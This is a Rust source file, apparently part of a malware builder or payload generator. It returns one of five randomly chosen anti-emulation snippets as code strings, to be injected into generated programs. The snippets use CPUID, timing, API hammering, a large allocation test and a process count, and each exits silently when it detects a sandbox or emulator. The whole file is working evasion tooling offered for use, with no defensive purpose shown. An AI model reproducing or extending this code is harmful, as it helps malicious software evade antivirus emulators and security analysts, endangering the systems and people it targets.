use rand::Rng;

pub fn select_anti_emulation(rng: &mut impl Rng) -> String {
    let technique = rng.gen_range(0..5);
    match technique {
        0 => anti_emulation_cpuid(),
        1 => anti_emulation_timing(),
        2 => anti_emulation_api_hammering(),
        3 => anti_emulation_heap_spray(),
        _ => anti_emulation_process_count(),
    }
}

fn anti_emulation_cpuid() -> String {
    r#"    // Anti-emulation: CPUID check
    {
        #[cfg(target_arch = "x86_64")]
        {
            let result = unsafe { core::arch::x86_64::__cpuid(1) };
            if result.eax == 0 && result.ecx == 0 && result.edx == 0 { std::process::exit(0); }
        }
    }"#
    .to_string()
}

fn anti_emulation_timing() -> String {
    r#"    // Anti-emulation: Timing check
    {
        use windows_sys::Win32::System::SystemInformation::GetTickCount64;
        use windows_sys::Win32::System::Memory::*;
        let start = unsafe { GetTickCount64() };
        for _ in 0..500 {
            unsafe {
                let addr = VirtualAlloc(
                    std::ptr::null(),
                    4096,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE,
                );
                if !addr.is_null() {
                    VirtualFree(addr, 0, MEM_RELEASE);
                }
            }
        }
        let end = unsafe { GetTickCount64() };
        if end.wrapping_sub(start) < 1 { std::process::exit(0); }
    }"#
    .to_string()
}

fn anti_emulation_api_hammering() -> String {
    r#"    // Anti-emulation: API hammering
    {
        use windows_sys::Win32::System::Memory::*;
        use std::time::Instant;
        let start = Instant::now();
        for _ in 0..5000 {
            unsafe {
                let addr = VirtualAlloc(
                    std::ptr::null(),
                    4096,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE,
                );
                if !addr.is_null() {
                    VirtualFree(addr, 0, MEM_RELEASE);
                }
            }
        }
        let elapsed = start.elapsed();
        if elapsed.as_micros() < 100 { std::process::exit(0); }
    }"#
    .to_string()
}

fn anti_emulation_heap_spray() -> String {
    r#"    // Anti-emulation: Heap spray size check
    {
        use windows_sys::Win32::System::Memory::*;
        let addr = unsafe {
            VirtualAlloc(
                std::ptr::null(),
                300 * 1024 * 1024,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )
        };
        if addr.is_null() {
            std::process::exit(0);
        }
        unsafe { VirtualFree(addr, 0, MEM_RELEASE); }
    }"#
    .to_string()
}

fn anti_emulation_process_count() -> String {
    r#"    // Anti-emulation: Process count check
    {
        use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
        use windows_sys::Win32::Foundation::*;
        let mut count: u32 = 0;
        unsafe {
            let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snap != INVALID_HANDLE_VALUE {
                let mut entry: PROCESSENTRY32W = std::mem::zeroed();
                entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
                if Process32FirstW(snap, &mut entry) != 0 {
                    count += 1;
                    while Process32NextW(snap, &mut entry) != 0 {
                        count += 1;
                    }
                }
                CloseHandle(snap);
            }
        }
        if count < 15 { std::process::exit(0); }
    }"#
    .to_string()
}
